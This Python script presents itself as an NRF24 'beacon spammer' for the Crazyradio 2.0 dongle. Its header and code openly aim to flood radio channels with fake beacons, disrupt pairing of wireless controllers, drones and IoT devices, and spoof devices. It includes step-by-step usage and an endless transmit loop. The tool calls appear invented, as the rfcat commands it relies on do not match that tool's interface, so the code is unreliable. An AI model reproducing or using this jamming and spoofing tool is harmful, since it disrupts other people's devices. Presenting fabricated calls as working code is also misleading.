import argparse
import os
import time

# -------------------------------------------
# Crazyradio 2.0 NRF24 Beacon Spammer
# -------------------------------------------
# Features:
# - Floods NRF24 frequencies with fake device beacons
# - Disrupts pairing mechanisms for wireless controllers, drones, and IoT devices
# - Spoofs fake NRF24 devices to confuse legitimate systems
# - Adjustable frequency and interval settings for fine-tuned attacks
#
# Requirements:
# - Crazyradio 2.0 USB Dongle
# - Python 3.x
# - RFCat & nrf-research-firmware (https://github.com/arcao/nrf-research-firmware)
#
# Usage:
# 1. Scan for active NRF24 devices:
#    python crazyradio_nrf24_beacon_spammer.py --scan
# 2. Start beacon spamming on default settings:
#    python crazyradio_nrf24_beacon_spammer.py --spam
# 3. Customize the spam frequency and interval:
#    python crazyradio_nrf24_beacon_spammer.py --spam --channel 76 --interval 0.1
# -------------------------------------------

def scan_nrf24():
    """Scans for active NRF24-based devices."""
    print("[+] Scanning for NRF24 devices...")
    os.system("rfcat -r 'd.scan()' > nrf24_scan_results.txt")
    print("[✔] Scan complete. Results saved to nrf24_scan_results.txt")

def beacon_spam(channel, interval):
    """Floods the NRF24 frequency range with fake beacons."""
    print(f"[+] Starting beacon spam on channel {channel} with {interval}s interval...")
    while True:
        os.system(f"rfcat -r 'd.beacon_spam({channel})'")
        time.sleep(interval)

def main():
    parser = argparse.ArgumentParser(description="Crazyradio 2.0 NRF24 Beacon Spammer")
    parser.add_argument("--scan", action='store_true', help="Scan for active NRF24 devices")
    parser.add_argument("--spam", action='store_true', help="Start beacon spamming")
    parser.add_argument("--channel", type=int, default=76, help="Channel to send beacons on (default: 76)")
    parser.add_argument("--interval", type=float, default=0.5, help="Time interval between beacon transmissions (default: 0.5s)")
    args = parser.parse_args()

    if args.scan:
        scan_nrf24()
    elif args.spam:
        beacon_spam(args.channel, args.interval)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
